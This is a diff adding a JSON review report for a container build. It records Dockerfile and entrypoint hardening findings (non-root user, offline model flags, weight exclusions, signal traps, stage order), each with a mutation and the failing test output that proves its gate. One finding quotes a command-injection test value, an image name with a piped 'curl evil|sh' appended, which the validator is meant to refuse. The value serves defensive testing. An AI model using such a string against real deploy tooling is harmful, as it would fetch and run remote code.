@@ -1,0 +1,116 @@
+{
+  "lane": "w10c",
+  "base": "cbb1f476",
+  "findings": [
+    {
+      "finding_id": "REV-r08112960-A-08",
+      "verdict": "STILL_LIVE",
+      "code_lines": "scripts/docker-entrypoint.sh:91-98 — VLM path fails closed when /data/cache exists but is unreadable by uid 10001, with ACX_MODELS_PATH ownership hint; Dockerfile:117-119 documents host bind ownership wins over image chown",
+      "gate": "recognition/tests/unit/test_fir_release_gates.py::test_entrypoint_unreadable_data_cache_fails_closed",
+      "mutation": "lines 91-98: deleted the unreadable /data/cache fail-closed if-block entirely",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError:\n    assert 0 == 1\n     +  where 0 = CompletedProcess(...returncode=0...).returncode\n.../test_fir_release_gates.py:259: AssertionError\nFAILED ...::test_entrypoint_unreadable_data_cache_fails_closed - AssertionError:\nassert 0 == 1\n1 failed in 0.09s",
+      "notes": "Code already had the boot-time ownership assertion (wave 9), but no test gated it — full suite stayed green when the block was removed. Added behavioural fixture (path-rewritten real entrypoint + mode 000 cache). README host ownership docs remain sibling-lane (w10d) surface."
+    },
+    {
+      "finding_id": "S1-RA-07",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "Dockerfile:24-29 distinct acx-backend-vlm repo; :194-198 / :229-231 bake /app/.image-variant (vlm|recognition) + ENV ACX_IMAGE_VARIANT; entrypoint:27-47 bake-first fail-closed",
+      "gate": "recognition/tests/deploy/test_runtime_packaging.py::test_rc04_both_runtimes_bake_immutable_image_variant",
+      "mutation": "line 198: RUN printf 'vlm\\n' > /app/.image-variant && chmod 0444 /app/.image-variant → RUN true",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: runtime-vlm must `printf 'vlm\\n' > /app/.image-variant && chmod 0444` (ENV ACX_IMAGE_VARIANT alone fails open under compose env_file)\n    assert False\n.../test_runtime_packaging.py:553: AssertionError\nFAILED ...::test_rc04_both_runtimes_bake_immutable_image_variant\n1 failed in 0.04s"
+    },
+    {
+      "finding_id": "S1-RB-03",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "Dockerfile:130-132 runtime-base creates uid 10001 + mkdir/chown writable paths; :217 USER acx on runtime-vlm; :244 USER acx on runtime; no VOLUME instruction (RA-10)",
+      "gate": "recognition/tests/deploy/test_runtime_packaging.py::test_rc04_both_runtimes_drop_privilege",
+      "mutation": "line 244: USER acx → USER root (runtime stage final USER)",
+      "red_output": "F. [100%]\n=================================== FAILURES ===================================\nE   AssertionError: runtime effective body must end as USER acx (RB-03): the serving process must not run as root; last USER='root'\n    assert False\n.../test_runtime_packaging.py:452: AssertionError\nFAILED ...::test_rc04_both_runtimes_drop_privilege\n1 failed, 1 passed, 35 deselected in 0.06s"
+    },
+    {
+      "finding_id": "S1-RB-05",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "Dockerfile:206-208 HF_HUB_OFFLINE=1 + TRANSFORMERS_OFFLINE=1 on runtime-vlm; entrypoint:99-104 python -m scripts.verify_vlm_cache on VLM bake path before uvicorn",
+      "gate": "recognition/tests/unit/test_fir_release_gates.py::test_dockerfile_stage_topology_keeps_default_torch_free (offline ENV) + recognition/tests/deploy/test_runtime_packaging.py::test_entrypoint_cmd_chain_modules_are_copied (verify_vlm_cache)",
+      "mutation": "conjunct1 line 207: ENV HF_HUB_OFFLINE=1 → 0; conjunct2 line 100: python -m scripts.verify_vlm_cache & → # MUTATED (removed invoke)",
+      "red_output": "offline: AssertionError: runtime-vlm must set ENV HF_HUB_OFFLINE=1 (fail closed if weights missing)\n.../test_fir_release_gates.py:310\n1 failed\nverify: AssertionError: verify_vlm_cache gate must compare ACX_IMAGE_VARIANT equal to \"vlm\"; inverted = \"recognition\" ships a VLM boot dependency on recognition (M7)\nassert False = _vlm_cache_gate_polarity_ok(...)\n.../test_runtime_packaging.py:325\n1 failed",
+      "notes": "Proved both conjuncts separately. Florence adapter exception taxonomy is outside this lane file set."
+    },
+    {
+      "finding_id": "R0811-V-10",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "Dockerfile:117-129 comments state /data/cache is :ro host bind (image chown is unmounted seed only); real writable chowns: /var/lib/acx-blobs, /var/cache/acx/hf_modules, /var/log/acx; :214-216 USER acx write surface",
+      "gate": "recognition/tests/deploy/test_runtime_packaging.py::test_rc04_runtime_base_acx_user_and_cache_chown_only",
+      "mutation": "lines 131-132: removed /var/lib/acx-blobs from both mkdir -p and chown lists",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: runtime-base must chown /var/lib/acx-blobs so USER acx can write there\n    assert False\n.../test_runtime_packaging.py:502: AssertionError\nFAILED ...::test_rc04_runtime_base_acx_user_and_cache_chown_only\n1 failed in 0.04s",
+      "notes": "Comment model corrected; operational gate requires chown of real writable paths (not /app|/opt/venv)."
+    },
+    {
+      "finding_id": "REV-r08112960-C-06",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "Dockerfile:239-244 recognition runtime also drops USER acx (no longer vlm-only); comment documents same write model as runtime-vlm",
+      "gate": "recognition/tests/deploy/test_runtime_packaging.py::test_rc04_both_runtimes_drop_privilege",
+      "mutation": "line 244: USER acx → USER root on final runtime stage",
+      "red_output": "E   AssertionError: runtime effective body must end as USER acx (RB-03): the serving process must not run as root; last USER='root'\nFAILED ...::test_rc04_both_runtimes_drop_privilege\n1 failed",
+      "notes": "Finding described a deferral (vlm-only privilege drop). Code now drops root on both serving stages; gate enforces both."
+    },
+    {
+      "finding_id": "S1-RC-05",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": ".dockerignore:40-69 depth-recursive weight class excludes (**/*.safetensors, **/*.bin, **/*.pt, **/*.pth, **/*.gguf, **/*.msgpack, **/models--*/) plus ONNX face weights; comments document docker vs rsync parity",
+      "gate": "recognition/tests/deploy/test_dockerignore_weight_exclusions.py::test_dockerignore_weight_classes_are_docker_depth_recursive",
+      "mutation": "line 63: **/*.safetensors → # MUTATED_OUT **/*.safetensors",
+      "red_output": "F.. [100%]\n=================================== FAILURES ===================================\nE   AssertionError: .dockerignore missing Docker-recursive coverage for classes: ['safetensors']. Extensions must be **/*.<ext>; HF snapshots must be **/models--*/.\n.../test_dockerignore_weight_exclusions.py:311\nFAILED ...::test_dockerignore_weight_classes_are_docker_depth_recursive\n1 failed, 2 passed, 15 deselected"
+    },
+    {
+      "finding_id": "REV-r08112960-A-13",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "scripts/docker-entrypoint.sh:12-25 trap _on_term TERM INT; :65-81 long steps (alembic/sync/verify) under &+wait; :105-107 trap cleared then exec uvicorn",
+      "gate": "recognition/tests/unit/test_fir_release_gates.py::test_entrypoint_traps_term_during_pre_uvicorn",
+      "mutation": "conjunct1 line 25: trap '_on_term' TERM INT → trap '' INT; conjunct2 line 68: alembic ... & → alembic ... (foreground)",
+      "red_output": "trap: AssertionError: entrypoint must install trap _on_term TERM before long boot steps\n.../test_fir_release_gates.py:146\n1 failed\nalembic&: AssertionError: alembic must run under &+wait so SIGTERM can interrupt the migrate step\n.../test_fir_release_gates.py:152\n1 failed"
+    },
+    {
+      "finding_id": "REV-r0811af90-S1-A-08",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "scripts/docker-entrypoint.sh:45-47 export ACX_IMAGE_VARIANT=\"${BAKED_IMAGE_VARIANT}\" (prefer bake; export so children see it)",
+      "gate": "recognition/tests/unit/test_fir_release_gates.py::test_entrypoint_exports_baked_image_variant",
+      "mutation": "line 47: export ACX_IMAGE_VARIANT=... → bare ACX_IMAGE_VARIANT=... (no export)",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: docker-entrypoint.sh must `export ACX_IMAGE_VARIANT=...` from the bake (plain assignment is not visible to children if image ENV is stripped)\n    assert None\n.../test_fir_release_gates.py:137: AssertionError\nFAILED ...::test_entrypoint_exports_baked_image_variant\n1 failed in 0.12s"
+    },
+    {
+      "finding_id": "S1-RC-06",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "Dockerfile stage order ends with runtime (L223); builder has no --extra vlm; builder-vlm/runtime-vlm present; runtime-vlm sets HF offline ENVs; gated in test_fir_release_gates",
+      "gate": "recognition/tests/unit/test_fir_release_gates.py::test_dockerfile_stage_topology_keeps_default_torch_free",
+      "mutation": "appended final stage: FROM runtime-base AS runtime-vlm-extra (last stage no longer runtime)",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: last Dockerfile stage is 'runtime-vlm-extra'; bare docker build would ship it. 'runtime' must stay last (S1-RC-06 / RA-05).\n    assert 'runtime-vlm-extra' == 'runtime'\n.../test_fir_release_gates.py:290: AssertionError\n1 failed in 0.10s"
+    },
+    {
+      "finding_id": "REV-r08112960-B-10",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "test_fir_release_gates.py:65-76 _SHIPPABLE_IMAGE_STAGES = (builder, builder-vlm, runtime, runtime-vlm); unlocked-install + ORT gates use effective bodies for all shippable stages",
+      "gate": "recognition/tests/unit/test_fir_release_gates.py::test_dockerfile_rejects_unlocked_pip_bench_dependency_install",
+      "mutation": "after line 93 (builder-vlm): inject RUN pip install \".[bench,vlm]\"",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: shippable image stages (builder, builder-vlm, runtime, runtime-vlm) must not use unlocked project+extras pip/uv install ... Found:\n        - builder-vlm: RUN pip install \".[bench,vlm]\"\n.../test_fir_release_gates.py:249: AssertionError\n1 failed in 0.10s"
+    },
+    {
+      "finding_id": "REV-r0811af90-S2-A-11",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "scripts/test_acx_backend_image_contract.py:633-692 executes real assert_safe_image_repo body via bash probe; D4/D6/D9/D10 behavioural ssh-stub tests present",
+      "gate": "scripts/test_acx_backend_image_contract.py::test_assert_safe_image_repo_refuses_evil_and_accepts_ocir",
+      "mutation": "scripts/deploy/recognition-service.sh assert_safe_image_repo: insert `return 0` immediately after function open brace",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: assert_safe_image_repo must refuse 'iad.ocir.io/ns/acx; curl evil|sh'; stdout='ACCEPTED\\n' stderr=''\n    assert 0 != 0\n.../test_acx_backend_image_contract.py:684: AssertionError\n1 failed in 0.04s",
+      "notes": "Deploy script mutation was temporary proof only (sibling-owned file restored; not committed)."
+    },
+    {
+      "finding_id": "S1-RA-05",
+      "verdict": "ALREADY_FIXED",
+      "code_lines": "scripts/test_acx_backend_image_contract.py:25-31 stage-aware; assert_default_target_is_runtime + effective_stage_body scoped COPY/ARG/ENV checks",
+      "gate": "scripts/test_acx_backend_image_contract.py::test_dockerfile_default_target_is_runtime",
+      "mutation": "appended final stage FROM runtime-base AS runtime-vlm-extra after runtime",
+      "red_output": "F [100%]\n=================================== FAILURES ===================================\nE   AssertionError: last Dockerfile stage is 'runtime-vlm-extra', so a bare `docker build` would build it. 'runtime' must stay last or production ships the non-default (e.g. torch-bearing) image (ORCH-LAUNCH-01-S1-RA-05 / BR-01).\n    assert 'runtime-vlm-extra' == 'runtime'\n.../test_acx_backend_image_contract.py:90: AssertionError\n1 failed in 0.04s"
+    }
+  ],
+  "test_counts": "deploy+fir_release_gates 231 passed; image_contract 22 passed; fir_release_gates alone 49 passed (incl. new A-08 gate)"
+}
